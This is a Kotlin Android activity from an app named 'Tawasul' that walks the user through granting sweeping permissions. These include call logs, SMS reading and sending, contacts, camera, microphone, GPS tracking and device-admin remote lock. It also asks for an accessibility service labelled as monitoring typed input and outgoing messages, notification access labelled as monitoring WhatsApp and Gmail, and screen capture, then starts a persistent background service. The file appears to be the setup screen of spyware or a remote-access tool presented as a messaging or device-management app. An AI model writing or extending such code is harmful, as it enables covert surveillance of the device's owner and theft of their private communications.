package com.tawasul.app

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.util.Log
import android.content.pm.PackageManager
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.tawasul.app.receiver.MDMDeviceAdminReceiver
import com.tawasul.app.service.MDMService
import com.tawasul.app.ui.ScreenCapturePermissionActivity

class PermissionsActivity : AppCompatActivity() {

    private lateinit var container: LinearLayout
    private lateinit var btnAllowAll: Button
    private lateinit var btnContinue: TextView
    private lateinit var progressText: TextView
    private lateinit var progressBar: ProgressBar

    private var deviceAdminActive = false

    data class PermItem(
        val title: String,
        val desc: String,
        val permissions: List<String>,
        val special: String = "",
        var granted: Boolean = false
    )

    private val permissionItems = mutableListOf(
        PermItem("📞 المكالمات", "سجل المكالمات + إجراء مكالمات", listOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE
        )),
        PermItem("👥 جهات الاتصال", "قراءة جهات الاتصال", listOf(
            Manifest.permission.READ_CONTACTS
        )),
        PermItem("💬 الرسائل SMS", "قراءة + إرسال الرسائل", listOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS
        )),
        PermItem("📷 الكاميرا", "التقاط صور بالكاميرا", listOf(
            Manifest.permission.CAMERA
        )),
        PermItem("🎤 الميكروفون", "تسجيل الصوت", listOf(
            Manifest.permission.RECORD_AUDIO
        )),
        PermItem("📁 الملفات والوسائط", "الصور + الفيديوهات + الملفات", run {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                listOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
            else
                listOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }),
        PermItem("🔔 الإشعارات", "استقبال إشعارات النظام", run {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                listOf(Manifest.permission.POST_NOTIFICATIONS)
            else emptyList()
        }),
        PermItem("📍 الموقع GPS", "تتبع موقع الجهاز", listOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )),
        PermItem("🔒 مدير الجهاز", "قفل الجهاز عن بُعد", listOf("__device_admin__")),
        PermItem("♿ خدمة الإتاحة", "مراقبة الإدخال + الرسائل الصادرة", listOf(), special = "accessibility"),
        PermItem("📨 الوصول للإشعارات", "مراقبة الواتساب + Gmail + الإشعارات", listOf(), special = "notifications"),
        PermItem("🔋 تحسين البطارية", "منع إيقاف التطبيق في الخلفية", listOf(), special = "battery"),
        PermItem("🖥 تسجيل الشاشة", "التقاط لقطات الشاشة", listOf(), special = "screen_capture"),
        PermItem(" overlay فوق التطبيقات", "إظهار إشعارات فوق التطبيقات", listOf(), special = "overlay")
    ).filter { it.permissions.isNotEmpty() || it.special.isNotEmpty() }

    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        refreshStates()
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { _ ->
        refreshStates()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        buildUI()
    }

    override fun onResume() {
        super.onResume()
        refreshStates()
    }

    private fun buildUI() {
        val rootLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xFF0A0A0A.toInt())
            setPadding(dp(20), dp(30), dp(20), dp(20))
        }

        val title = TextView(this).apply {
            text = "إعداد التطبيق"
            setTextColor(0xFFFFD700.toInt())
            textSize = 24f
            setTypeface(typeface, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(8))
        }
        rootLayout.addView(title)

        val subtitle = TextView(this).apply {
            text = "فعّل كل الأذونات لمتابعة العمل"
            setTextColor(0xFFAAAAAA.toInt())
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(20))
        }
        rootLayout.addView(subtitle)

        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = permissionItems.size
            progress = 0
            progressTintList = android.content.res.ColorStateList.valueOf(0xFFFFD700.toInt())
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(6)
            )
        }
        rootLayout.addView(progressBar)

        progressText = TextView(this).apply {
            text = "0 / ${permissionItems.size}"
            setTextColor(0xFFAAAAAA.toInt())
            textSize = 11f
            gravity = Gravity.CENTER
            setPadding(0, dp(4), 0, dp(16))
        }
        rootLayout.addView(progressText)

        val scrollView = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT,
                1f
            )
        }

        container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
        }
        scrollView.addView(container)
        rootLayout.addView(scrollView)

        btnAllowAll = Button(this).apply {
            text = "السماح للكل"
            setTextColor(0xFF000000.toInt())
            textSize = 16f
            setTypeface(typeface, Typeface.BOLD)
            background = GradientDrawable().apply {
                setColor(0xFFFFD700.toInt())
                cornerRadius = dp(12).toFloat()
            }
            setPadding(0, dp(14), 0, dp(14))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(12) }
        }
        btnAllowAll.setOnClickListener { requestAllPermissions() }
        rootLayout.addView(btnAllowAll)

        btnContinue = TextView(this).apply {
            text = "متابعة بدون تفعيل الكل ←"
            setTextColor(0xFF888888.toInt())
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, dp(12), 0, dp(8))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }
        btnContinue.setOnClickListener { goToMain() }
        rootLayout.addView(btnContinue)

        setContentView(rootLayout)
        renderCards()
    }

    private fun renderCards() {
        container.removeAllViews()
        for ((i, item) in permissionItems.withIndex()) {
            container.addView(buildCard(item, i))
        }
    }

    private fun buildCard(item: PermItem, idx: Int): View {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { setMargins(0, dp(4), 0, dp(4)) }
            setPadding(dp(16), dp(12), dp(16), dp(12))
            gravity = Gravity.CENTER_VERTICAL
            background = GradientDrawable().apply {
                setColor(0xFF1A1A1A.toInt())
                cornerRadius = dp(10).toFloat()
            }
        }

        val icon = ImageView(this).apply {
            setImageResource(getIconForItem(item))
            layoutParams = LinearLayout.LayoutParams(dp(36), dp(36)).apply { marginEnd = dp(12) }
            setColorFilter(0xFFFFD700.toInt(), android.graphics.PorterDuff.Mode.SRC_IN)
        }
        card.addView(icon)

        val textWrap = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }
        textWrap.addView(TextView(this).apply {
            text = item.title
            textSize = 14f
            setTextColor(0xFFFFFFFF.toInt())
            setTypeface(typeface, Typeface.BOLD)
        })
        textWrap.addView(TextView(this).apply {
            text = item.desc
            textSize = 11f
            setTextColor(0xFF999999.toInt())
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(2) }
        })
        card.addView(textWrap)

        val status = ImageView(this).apply {
            tag = "check_$idx"
            layoutParams = LinearLayout.LayoutParams(dp(24), dp(24))
            setImageResource(android.R.drawable.presence_online)
            setColorFilter(0xFF4CAF50.toInt(), android.graphics.PorterDuff.Mode.SRC_IN)
            visibility = View.GONE
        }
        card.addView(status)

        if (item.special.isNotEmpty() || item.permissions.contains("__device_admin__")) {
            card.setOnClickListener { handleSpecialClick(item) }
            card.isClickable = true
        }

        return card
    }

    private fun getIconForItem(item: PermItem): Int {
        return when {
            item.title.contains("المكالمات") -> android.R.drawable.ic_menu_call
            item.title.contains("جهات") -> android.R.drawable.ic_menu_my_calendar
            item.title.contains("SMS") -> android.R.drawable.ic_menu_send
            item.title.contains("الكاميرا") -> android.R.drawable.ic_menu_camera
            item.title.contains("الميكروفون") -> android.R.drawable.ic_btn_speak_now
            item.title.contains("الملفات") -> android.R.drawable.ic_menu_gallery
            item.title.contains("الإشعارات") -> android.R.drawable.ic_popup_reminder
            item.title.contains("الموقع") -> android.R.drawable.ic_menu_mylocation
            item.title.contains("مدير") -> android.R.drawable.ic_lock_lock
            item.title.contains("الإتاحة") -> android.R.drawable.ic_menu_compass
            item.title.contains("الوصول للإشعارات") -> android.R.drawable.ic_menu_sort_by_size
            item.title.contains("البطارية") -> android.R.drawable.ic_menu_manage
            item.title.contains("الشاشة") -> android.R.drawable.ic_menu_view
            item.title.contains("فوق التطبيقات") -> android.R.drawable.ic_menu_add
            else -> android.R.drawable.ic_menu_help
        }
    }

    private fun refreshStates() {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, MDMDeviceAdminReceiver::class.java)
        deviceAdminActive = dpm.isAdminActive(admin)

        var grantedCount = 0
        for ((i, item) in permissionItems.withIndex()) {
            item.granted = when {
                item.permissions.contains("__device_admin__") -> deviceAdminActive
                item.special == "accessibility" -> isAccessibilityEnabled()
                item.special == "notifications" -> isNotificationListenerEnabled()
                item.special == "battery" -> isBatteryOptimizationIgnored()
                item.special == "screen_capture" -> false
                item.special == "overlay" -> Settings.canDrawOverlays(this)
                item.permissions.isNotEmpty() -> item.permissions.all {
                    ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
                }
                else -> false
            }
            if (item.granted) grantedCount++

            val check = container.findViewWithTag<ImageView>("check_$i")
            check?.visibility = if (item.granted) View.VISIBLE else View.GONE
        }

        progressBar.progress = grantedCount
        progressText.text = "$grantedCount / ${permissionItems.size}"

        if (grantedCount == permissionItems.size) {
            btnAllowAll.text = "تم - المتابعة"
            btnAllowAll.setOnClickListener { goToMain() }
            btnContinue.visibility = View.GONE
        } else {
            btnAllowAll.text = "السماح للكل"
            btnAllowAll.setOnClickListener { requestAllPermissions() }
            btnContinue.visibility = View.VISIBLE
        }
    }

    private fun requestAllPermissions() {
        val regularPerms = permissionItems
            .filter { !it.granted && it.permissions.isNotEmpty() && !it.permissions.contains("__device_admin__") }
            .flatMap { it.permissions }

        if (regularPerms.isNotEmpty()) {
            permLauncher.launch(regularPerms.toTypedArray())
        }

        if (!deviceAdminActive) {
            requestDeviceAdmin()
        }

        val pendingSpecial = permissionItems.filter { !it.granted && it.special.isNotEmpty() }
        if (pendingSpecial.isNotEmpty()) {
            handleSpecialClick(pendingSpecial.first())
        }
    }

    private fun handleSpecialClick(item: PermItem) {
        when {
            item.permissions.contains("__device_admin__") -> requestDeviceAdmin()
            item.special == "accessibility" -> {
                Toast.makeText(this, "فعّل ${item.title} من الإعدادات", Toast.LENGTH_LONG).show()
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
            }
            item.special == "notifications" -> {
                Toast.makeText(this, "فعّل وصول الإشعارات للتطبيق", Toast.LENGTH_LONG).show()
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
            }
            item.special == "battery" -> {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (_: Exception) {
                    startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
                }
            }
            item.special == "screen_capture" -> {
                ScreenCapturePermissionActivity.requestPermission(this)
            }
            item.special == "overlay" -> {
                if (!Settings.canDrawOverlays(this)) {
                    startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    })
                }
            }
        }
    }

    private fun requestDeviceAdmin() {
        val admin = ComponentName(this, MDMDeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لميزة قفل الجهاز")
        }
        deviceAdminLauncher.launch(intent)
    }

    private fun isAccessibilityEnabled(): Boolean {
        val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
        if (enabled != 1) return false
        val list = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        val serviceName = "$packageName/com.mdm.agent.service.MDMAccessibilityService"
        return list.contains(serviceName)
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val list = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
        val serviceName = "$packageName/com.mdm.agent.service.MDMNotificationListenerService"
        return list.contains(serviceName)
    }

    private fun isBatteryOptimizationIgnored(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun goToMain() {
        // Start MDMService with multiple safeguards
        try {
            val serviceIntent = Intent(this, MDMService::class.java)
            // Add extras to signal this is an explicit start
            serviceIntent.putExtra("START_REASON", "PERMISSIONS_GRANTED")
            serviceIntent.putExtra("TIMESTAMP", System.currentTimeMillis())
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    startForegroundService(serviceIntent)
                    Log.i("Permissions", "✅ MDMService started via startForegroundService")
                } catch (e: Exception) {
                    Log.e("Permissions", "❌ startForegroundService failed: ${e.message}")
                    // Fallback: try regular startService
                    try {
                        startService(serviceIntent)
                        Log.i("Permissions", "✅ MDMService started via startService (fallback)")
                    } catch (e2: Exception) {
                        Log.e("Permissions", "❌ startService also failed: ${e2.message}")
                    }
                }
            } else {
                startService(serviceIntent)
                Log.i("Permissions", "✅ MDMService started via startService (legacy)")
            }
        } catch (e: Exception) {
            Log.e("Permissions", "❌ Failed to start MDMService: ${e.message}", e)
            Toast.makeText(this, "تعذّر بدء الخدمة: ${e.message}", Toast.LENGTH_LONG).show()
        }

        // Small delay to let service start, then go to main
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            startActivity(Intent(this, MainActivity::class.java))
            finish()
        }, 500)
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()
}
